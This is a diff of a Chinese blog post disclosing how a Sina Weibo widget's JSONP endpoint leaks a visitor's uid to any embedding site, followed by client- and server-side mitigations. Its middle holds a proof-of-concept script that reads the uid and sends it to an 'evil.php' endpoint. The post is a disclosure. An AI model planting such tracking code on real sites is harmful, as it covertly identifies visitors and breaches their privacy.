@@ -6,13 +6,13 @@ comments: true
 categories: 
 ---
 
-这两天在研究新浪的第三方插件实现，发现通过利用新浪微博的某个URL能让我获取当前访问这个URL的用户的微博uid。也就是说只要在某个网站中嵌入一段代码，这段代码在后台偷偷的的访问那个URL，然后就可以把访问这个网站的用户的微博uid获取到，于是隐私就被泄露了…… 也就是说一个网站可以知道有哪些微博用户访问了它，然后可以就此采取一系列的措施……  
+这两天在研究新浪微博的第三方插件实现，无意中发现通过利用新浪微博的某个URL能让我获取当前访问这个URL的用户的微博uid。也就是说只要在某个网站中嵌入一段代码，这段代码在后台偷偷的的访问那个URL，然后就可以把访问这个网站的用户的微博uid获取到，于是隐私就被泄露了…… 也就是说一个网站可以知道有哪些微博用户访问了它，然后可以就此采取一系列的措施……  
 下面就具体讲讲这个漏洞是怎么回事。
 
 <!-- more -->
 
 ## 问题
-大家都知道微博会提供一些第三方插件(widget)用来放在其他网站上，其中有一个就是关注按钮。通过这个关注按钮用户就可以在第三方网站上直接关注某个人，如果当前访问用户已经关注过了，则该关注按钮会显示已关注。接下来我们就要看看在一个第三方的网站上新浪微博是怎样知道当前访问用户是否已经关注了某个账号，而这个涉及到JavaScript跨域问题。通过查看插件的js代码和浏览器的http请求，发现如果引入关注按钮插件的话会有如下的一个http请求：
+大家都知道微博会提供一些第三方插件(widget)用来放在其他网站上，其中有一个就是关注按钮。通过这个关注按钮用户就可以在第三方网站上直接关注某个人，如果当前访问用户已经关注过了，则该关注按钮会显示已关注。接下来我们就要看看在一个第三方的网站上新浪微博是怎样知道当前访问用户是否已经关注了某个账号，而这个涉及到[JavaScript跨域问题](http://en.wikipedia.org/wiki/Same_origin_policy)。通过查看插件的js代码和浏览器的http请求，发现如果引入关注按钮插件的话会有如下的一个http请求：
 	http://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_13591259816211
 
 返回结果是：
@@ -31,7 +31,9 @@ categories:
 <p> Hello World </p>
 <script>
 function STK_1(data) {
+// wow, get the uid
 var uid = data.data.uid;
+// save the uid to the server
 var xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", "http://www.jjyao.me/evil.php?uid=" + uid, true );
 xmlHttp.send(null);
@@ -51,7 +53,7 @@ xmlHttp.send(null);
 解决这个问题的手段无非就是两大类：一类是用户在客户端解决，一类是新浪在服务端解决。
 
 ### 客户端解决
-我尝试了不记住密码，在Chrome的Incognito Window中打开两种方法但是都不可行，因为这两种方法虽然不会长期记住cookie，但仍然会短期的记住直到比如说浏览器关闭为止。因此要在客户端解决的话可以选择彻底禁止cookie，或者每次刷完微博后都清除微博设置的cookie，然后再去访问其他网站。
+在客户端解决的话我们要做的就是在向widget.weibo.com发送请求时，不让浏览器发送新浪微博的Session Cookie和Third-Party Cookie，因为就是这Cookie才使得新浪知道当前用户是谁的。相比于禁止发送Session Cookie而言，禁止Third-Party Cookie会更容易。要想禁止Third-Party Cookie可以禁止储存它或者储存了但是禁止发送。要想不存储Third-Party Cookie可以选择不记住密码，在Chrome的Incognito Window中打开，在浏览器中设置不保存Cookie这几种方法。而要想禁止发送Third-Party Cookie可以选择IE或者Safari浏览器，因为这两个浏览器出于安全的考虑，默认禁止了浏览器在`<img>`、`<iframe>`、`<script>`、`<link>`等标签中发送Third-Party Cookie，所以如果用IE或者Safari，那么网站可能不知道当前用户是谁了。解决了Third-Party Cookie并不表示问题解决了，因为还有Session Cookie。也就说如果在当前Session中访问过新浪微博，那么微博就会设置Session Cookie，在同一个Session再去访问安插有恶意代码的网站，还是能使网站知道当前用户的微博uid，因此在访问完新浪后要退出浏览器或者执行其他能让浏览器清除Session Cookie的操作，然后再去访问其他网站，这样就能解决Session Cookie的问题了。只有同时解决了Session Cookie和Third-Party Cookie，上述的隐私泄露问题才能得到解决。
 
 ### 服务器端解决
-服务器端解决最简单的方法就是不返回uid信息。但如果一定要返回uid信息的话就要采用比较复杂的方法了。
+服务器端解决最简单的方法就是不返回uid信息，或者是采取措施限制CSRF。对于后一种做法就引申出一个大的Topic了，有兴趣的可以看看[《白帽子讲Web安全》](http://book.douban.com/subject/10546925/)中有关于如何防止CSRF的章节。另外，这确实是本好书:)
